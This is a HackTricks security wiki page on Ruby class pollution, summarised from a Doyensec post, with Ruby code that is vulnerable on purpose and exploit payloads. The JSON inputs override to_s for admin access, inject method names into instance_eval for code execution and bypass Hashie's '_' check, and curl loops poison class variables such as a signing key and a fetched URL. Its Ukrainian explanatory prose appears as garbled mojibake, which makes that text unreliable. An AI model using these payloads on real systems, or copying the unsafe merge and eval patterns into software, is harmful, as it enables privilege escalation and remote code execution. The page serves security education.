# Ruby Class Pollution

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

–¶–µ —Ä–µ–∑—é–º–µ –∑ –ø–æ—Å—Ç—É [https://blog.doyensec.com/2024/10/02/class-pollution-ruby.html](https://blog.doyensec.com/2024/10/02/class-pollution-ruby.html)

## –ó–ª–∏—Ç—Ç—è –∑–∞ –∞—Ç—Ä–∏–±—É—Ç–∞–º–∏

–ü—Ä–∏–∫–ª–∞–¥:
```ruby
# Code from https://blog.doyensec.com/2024/10/02/class-pollution-ruby.html
# Comments added to exploit the merge on attributes
require 'json'


# Base class for both Admin and Regular users
class Person

attr_accessor :name, :age, :details

def initialize(name:, age:, details:)
@name = name
@age = age
@details = details
end

# Method to merge additional data into the object
def merge_with(additional)
recursive_merge(self, additional)
end

# Authorize based on the `to_s` method result
def authorize
if to_s == "Admin"
puts "Access granted: #{@name} is an admin."
else
puts "Access denied: #{@name} is not an admin."
end
end

# Health check that executes all protected methods using `instance_eval`
def health_check
protected_methods().each do |method|
instance_eval(method.to_s)
end
end

private

# VULNERABLE FUNCTION that can be abused to merge attributes
def recursive_merge(original, additional, current_obj = original)
additional.each do |key, value|

if value.is_a?(Hash)
if current_obj.respond_to?(key)
next_obj = current_obj.public_send(key)
recursive_merge(original, value, next_obj)
else
new_object = Object.new
current_obj.instance_variable_set("@#{key}", new_object)
current_obj.singleton_class.attr_accessor key
end
else
current_obj.instance_variable_set("@#{key}", value)
current_obj.singleton_class.attr_accessor key
end
end
original
end

protected

def check_cpu
puts "CPU check passed."
end

def check_memory
puts "Memory check passed."
end
end

# Admin class inherits from Person
class Admin < Person
def initialize(name:, age:, details:)
super(name: name, age: age, details: details)
end

def to_s
"Admin"
end
end

# Regular user class inherits from Person
class User < Person
def initialize(name:, age:, details:)
super(name: name, age: age, details: details)
end

def to_s
"User"
end
end

class JSONMergerApp
def self.run(json_input)
additional_object = JSON.parse(json_input)

# Instantiate a regular user
user = User.new(
name: "John Doe",
age: 30,
details: {
"occupation" => "Engineer",
"location" => {
"city" => "Madrid",
"country" => "Spain"
}
}
)


# Perform a recursive merge, which could override methods
user.merge_with(additional_object)

# Authorize the user (privilege escalation vulnerability)
# ruby class_pollution.rb '{"to_s":"Admin","name":"Jane Doe","details":{"location":{"city":"Barcelona"}}}'
user.authorize

# Execute health check (RCE vulnerability)
# ruby class_pollution.rb '{"protected_methods":["puts 1"],"name":"Jane Doe","details":{"location":{"city":"Barcelona"}}}'
user.health_check

end
end

if ARGV.length != 1
puts "Usage: ruby class_pollution.rb 'JSON_STRING'"
exit
end

json_input = ARGV[0]
JSONMergerApp.run(json_input)
```
### –ü–æ—è—Å–Ω–µ–Ω–Ω—è

1. **–ï—Å–∫–∞–ª–∞—Ü—ñ—è –ü—Ä–∏–≤—ñ–ª–µ—ó–≤**: –ú–µ—Ç–æ–¥ `authorize` –ø–µ—Ä–µ–≤—ñ—Ä—è—î, —á–∏ –ø–æ–≤–µ—Ä—Ç–∞—î `to_s` "Admin." –í–ø—Ä–æ–≤–∞–¥–∂—É—é—á–∏ –Ω–æ–≤–∏–π –∞—Ç—Ä–∏–±—É—Ç `to_s` —á–µ—Ä–µ–∑ JSON, –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –º–æ–∂–µ –∑–º—É—Å–∏—Ç–∏ –º–µ—Ç–æ–¥ `to_s` –ø–æ–≤–µ—Ä—Ç–∞—Ç–∏ "Admin," –Ω–∞–¥–∞—é—á–∏ –Ω–µ—Å–∞–Ω–∫—Ü—ñ–æ–Ω–æ–≤–∞–Ω—ñ –ø—Ä–∏–≤—ñ–ª–µ—ó.
2. **–í—ñ–¥–¥–∞–ª–µ–Ω–µ –í–∏–∫–æ–Ω–∞–Ω–Ω—è –ö–æ–¥—É**: –£ `health_check`, `instance_eval` –≤–∏–∫–æ–Ω—É—î –º–µ—Ç–æ–¥–∏, –∑–∞–∑–Ω–∞—á–µ–Ω—ñ –≤ `protected_methods`. –Ø–∫—â–æ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –≤–ø—Ä–æ–≤–∞–¥–∂—É—î –≤–ª–∞—Å–Ω—ñ —ñ–º–µ–Ω–∞ –º–µ—Ç–æ–¥—ñ–≤ (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, `"puts 1"`), `instance_eval` –≤–∏–∫–æ–Ω–∞—î –π–æ–≥–æ, —â–æ –ø—Ä–∏–∑–≤–µ–¥–µ –¥–æ **–≤—ñ–¥–¥–∞–ª–µ–Ω–æ–≥–æ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∫–æ–¥—É (RCE)**.
1. –¶–µ –º–æ–∂–ª–∏–≤–æ –ª–∏—à–µ —Ç–æ–º—É, —â–æ —ñ—Å–Ω—É—î **–≤—Ä–∞–∑–ª–∏–≤–∞ —ñ–Ω—Å—Ç—Ä—É–∫—Ü—ñ—è `eval`,** —è–∫–∞ –≤–∏–∫–æ–Ω—É—î —Ä—è–¥–∫–æ–≤–µ –∑–Ω–∞—á–µ–Ω–Ω—è —Ü—å–æ–≥–æ –∞—Ç—Ä–∏–±—É—Ç–∞.
3. **–û–±–º–µ–∂–µ–Ω–Ω—è –í–ø–ª–∏–≤—É**: –¶—è –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å –≤–ø–ª–∏–≤–∞—î –ª–∏—à–µ –Ω–∞ –æ–∫—Ä–µ–º—ñ –µ–∫–∑–µ–º–ø–ª—è—Ä–∏, –∑–∞–ª–∏—à–∞—é—á–∏ —ñ–Ω—à—ñ –µ–∫–∑–µ–º–ø–ª—è—Ä–∏ `User` —ñ `Admin` –Ω–µ—É—à–∫–æ–¥–∂–µ–Ω–∏–º–∏, —Ç–∞–∫–∏–º —á–∏–Ω–æ–º –æ–±–º–µ–∂—É—é—á–∏ –æ–±—Å—è–≥ –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó.

### –†–µ–∞–ª—å–Ω—ñ –í–∏–ø–∞–¥–∫–∏ <a href="#real-world-cases" id="real-world-cases"></a>

### ActiveSupport‚Äôs `deep_merge`

–¶–µ –Ω–µ —î –≤—Ä–∞–∑–ª–∏–≤–∏–º –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º, –∞–ª–µ –º–æ–∂–µ –±—É—Ç–∏ –∑—Ä–æ–±–ª–µ–Ω–æ –≤—Ä–∞–∑–ª–∏–≤–∏–º –∑ —á–∏–º–æ—Å—å –Ω–∞ –∫—à—Ç–∞–ª—Ç:&#x20;
```ruby
# Method to merge additional data into the object using ActiveSupport deep_merge
def merge_with(other_object)
merged_hash = to_h.deep_merge(other_object)

merged_hash.each do |key, value|
self.class.attr_accessor key
instance_variable_set("@#{key}", value)
end

self
end
```
### Hashie‚Äôs `deep_merge`

–ú–µ—Ç–æ–¥ `deep_merge` –≤ Hashie –ø—Ä–∞—Ü—é—î –±–µ–∑–ø–æ—Å–µ—Ä–µ–¥–Ω—å–æ –∑ –∞—Ç—Ä–∏–±—É—Ç–∞–º–∏ –æ–±'—î–∫—Ç–∞, –∞ –Ω–µ –∑ –ø—Ä–æ—Å—Ç–∏–º–∏ —Ö–µ—à–∞–º–∏. –í—ñ–Ω **–∑–∞–ø–æ–±—ñ–≥–∞—î –∑–∞–º—ñ–Ω—ñ –º–µ—Ç–æ–¥—ñ–≤** –Ω–∞ –∞—Ç—Ä–∏–±—É—Ç–∏ –ø—ñ–¥ —á–∞—Å –∑–ª–∏—Ç—Ç—è –∑ –¥–µ—è–∫–∏–º–∏ **–≤–∏–∫–ª—é—á–µ–Ω–Ω—è–º–∏**: –∞—Ç—Ä–∏–±—É—Ç–∏, —è–∫—ñ –∑–∞–∫—ñ–Ω—á—É—é—Ç—å—Å—è –Ω–∞ `_`, `!` –∞–±–æ `?`, –≤—Å–µ —â–µ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –∑–ª–∏—Ç—ñ –≤ –æ–±'—î–∫—Ç.

–û—Å–æ–±–ª–∏–≤–∏–º –≤–∏–ø–∞–¥–∫–æ–º —î –∞—Ç—Ä–∏–±—É—Ç **`_`** —Å–∞–º –ø–æ —Å–æ–±—ñ. –ü—Ä–æ—Å—Ç–æ `_` —î –∞—Ç—Ä–∏–±—É—Ç–æ–º, —è–∫–∏–π –∑–∞–∑–≤–∏—á–∞–π –ø–æ–≤–µ—Ä—Ç–∞—î –æ–±'—î–∫—Ç `Mash`. –Ü –æ—Å–∫—ñ–ª—å–∫–∏ —Ü–µ —á–∞—Å—Ç–∏–Ω–∞ **–≤–∏–∫–ª—é—á–µ–Ω—å**, –π–æ–≥–æ –º–æ–∂–Ω–∞ –º–æ–¥–∏—Ñ—ñ–∫—É–≤–∞—Ç–∏.

–ü–µ—Ä–µ–≥–ª—è–Ω—å—Ç–µ –Ω–∞—Å—Ç—É–ø–Ω–∏–π –ø—Ä–∏–∫–ª–∞–¥, —è–∫ –ø–µ—Ä–µ–¥–∞—é—á–∏ `{"_": "Admin"}`, –º–æ–∂–Ω–∞ –æ–±—ñ–π—Ç–∏ `_.to_s == "Admin"`:
```ruby
require 'json'
require 'hashie'

# Base class for both Admin and Regular users
class Person < Hashie::Mash

# Method to merge additional data into the object using hashie
def merge_with(other_object)
deep_merge!(other_object)
self
end

# Authorize based on to_s
def authorize
if _.to_s == "Admin"
puts "Access granted: #{@name} is an admin."
else
puts "Access denied: #{@name} is not an admin."
end
end

end

# Admin class inherits from Person
class Admin < Person
def to_s
"Admin"
end
end

# Regular user class inherits from Person
class User < Person
def to_s
"User"
end
end

class JSONMergerApp
def self.run(json_input)
additional_object = JSON.parse(json_input)

# Instantiate a regular user
user = User.new({
name: "John Doe",
age: 30,
details: {
"occupation" => "Engineer",
"location" => {
"city" => "Madrid",
"country" => "Spain"
}
}
})

# Perform a deep merge, which could override methods
user.merge_with(additional_object)

# Authorize the user (privilege escalation vulnerability)
# Exploit: If we pass {"_": "Admin"} in the JSON, the user will be treated as an admin.
# Example usage: ruby hashie.rb '{"_": "Admin", "name":"Jane Doe","details":{"location":{"city":"Barcelona"}}}'
user.authorize
end
end

if ARGV.length != 1
puts "Usage: ruby hashie.rb 'JSON_STRING'"
exit
end

json_input = ARGV[0]
JSONMergerApp.run(json_input)
```
## Poison the Classes <a href="#escaping-the-object-to-poison-the-class" id="escaping-the-object-to-poison-the-class"></a>

–£ –Ω–∞—Å—Ç—É–ø–Ω–æ–º—É –ø—Ä–∏–∫–ª–∞–¥—ñ –º–æ–∂–Ω–∞ –∑–Ω–∞–π—Ç–∏ –∫–ª–∞—Å **`Person`**, –∞ —Ç–∞–∫–æ–∂ –∫–ª–∞—Å–∏ **`Admin`** —Ç–∞ **`Regular`**, —è–∫—ñ —É—Å–ø–∞–¥–∫–æ–≤—É—é—Ç—å –≤—ñ–¥ –∫–ª–∞—Å—É **`Person`**. –í—ñ–Ω —Ç–∞–∫–æ–∂ –º–∞—î —ñ–Ω—à–∏–π –∫–ª–∞—Å –ø—ñ–¥ –Ω–∞–∑–≤–æ—é **`KeySigner`**:
```ruby
require 'json'
require 'sinatra/base'
require 'net/http'

# Base class for both Admin and Regular users
class Person
@@url = "http://default-url.com"

attr_accessor :name, :age, :details

def initialize(name:, age:, details:)
@name = name
@age = age
@details = details
end

def self.url
@@url
end

# Method to merge additional data into the object
def merge_with(additional)
recursive_merge(self, additional)
end

private

# Recursive merge to modify instance variables
def recursive_merge(original, additional, current_obj = original)
additional.each do |key, value|
if value.is_a?(Hash)
if current_obj.respond_to?(key)
next_obj = current_obj.public_send(key)
recursive_merge(original, value, next_obj)
else
new_object = Object.new
current_obj.instance_variable_set("@#{key}", new_object)
current_obj.singleton_class.attr_accessor key
end
else
current_obj.instance_variable_set("@#{key}", value)
current_obj.singleton_class.attr_accessor key
end
end
original
end
end

class User < Person
def initialize(name:, age:, details:)
super(name: name, age: age, details: details)
end
end

# A class created to simulate signing with a key, to be infected with the third gadget
class KeySigner
@@signing_key = "default-signing-key"

def self.signing_key
@@signing_key
end

def sign(signing_key, data)
"#{data}-signed-with-#{signing_key}"
end
end

class JSONMergerApp < Sinatra::Base
# POST /merge - Infects class variables using JSON input
post '/merge' do
content_type :json
json_input = JSON.parse(request.body.read)

user = User.new(
name: "John Doe",
age: 30,
details: {
"occupation" => "Engineer",
"location" => {
"city" => "Madrid",
"country" => "Spain"
}
}
)

user.merge_with(json_input)

{ status: 'merged' }.to_json
end

# GET /launch-curl-command - Activates the first gadget
get '/launch-curl-command' do
content_type :json

# This gadget makes an HTTP request to the URL stored in the User class
if Person.respond_to?(:url)
url = Person.url
response = Net::HTTP.get_response(URI(url))
{ status: 'HTTP request made', url: url, response_body: response.body }.to_json
else
{ status: 'Failed to access URL variable' }.to_json
end
end

# Curl command to infect User class URL:
# curl -X POST -H "Content-Type: application/json" -d '{"class":{"superclass":{"url":"http://example.com"}}}' http://localhost:4567/merge

# GET /sign_with_subclass_key - Signs data using the signing key stored in KeySigner
get '/sign_with_subclass_key' do
content_type :json

# This gadget signs data using the signing key stored in KeySigner class
signer = KeySigner.new
signed_data = signer.sign(KeySigner.signing_key, "data-to-sign")

{ status: 'Data signed', signing_key: KeySigner.signing_key, signed_data: signed_data }.to_json
end

# Curl command to infect KeySigner signing key (run in a loop until successful):
# for i in {1..1000}; do curl -X POST -H "Content-Type: application/json" -d '{"class":{"superclass":{"superclass":{"subclasses":{"sample":{"signing_key":"injected-signing-key"}}}}}}' http://localhost:4567/merge; done

# GET /check-infected-vars - Check if all variables have been infected
get '/check-infected-vars' do
content_type :json

{
user_url: Person.url,
signing_key: KeySigner.signing_key
}.to_json
end

run! if app_file == $0
end
```
### –û—Ç—Ä—É–π–Ω–∏–π –±–∞—Ç—å–∫—ñ–≤—Å—å–∫–∏–π –∫–ª–∞—Å

–ó —Ü–∏–º –∫–æ—Ä–∏—Å–Ω–∏–º –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è–º:

{% code overflow="wrap" %}
```bash
curl -X POST -H "Content-Type: application/json" -d '{"class":{"superclass":{"url":"http://malicious.com"}}}' http://localhost:4567/merge
```
{% endcode %}

–ú–æ–∂–ª–∏–≤–æ –∑–º—ñ–Ω–∏—Ç–∏ –∑–Ω–∞—á–µ–Ω–Ω—è –∞—Ç—Ä–∏–±—É—Ç–∞ **`@@url`** –±–∞—Ç—å–∫—ñ–≤—Å—å–∫–æ–≥–æ –∫–ª–∞—Å—É **`Person`**.

### **–û—Ç—Ä—É—î–Ω–Ω—è –Ü–Ω—à–∏—Ö –ö–ª–∞—Å—ñ–≤**

–ó —Ü–∏–º payload:

{% code overflow="wrap" %}
```bash
for i in {1..1000}; do curl -X POST -H "Content-Type: application/json" -d '{"class":{"superclass":{"superclass":{"subclasses":{"sample":{"signing_key":"injected-signing-key"}}}}}}' http://localhost:4567/merge --silent > /dev/null; done
```
{% endcode %}

–ú–æ–∂–ª–∏–≤–æ –∑–¥—ñ–π—Å–Ω–∏—Ç–∏ –±—Ä—É—Ç—Ñ–æ—Ä—Å –≤–∏–∑–Ω–∞—á–µ–Ω–∏—Ö –∫–ª–∞—Å—ñ–≤ —ñ –≤ —è–∫–∏–π—Å—å –º–æ–º–µ–Ω—Ç –æ—Ç—Ä—É—ó—Ç–∏ –∫–ª–∞—Å **`KeySigner`**, –∑–º—ñ–Ω–∏–≤—à–∏ –∑–Ω–∞—á–µ–Ω–Ω—è `signing_key` –Ω–∞ `injected-signing-key`.\

## References

* [https://blog.doyensec.com/2024/10/02/class-pollution-ruby.html](https://blog.doyensec.com/2024/10/02/class-pollution-ruby.html)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
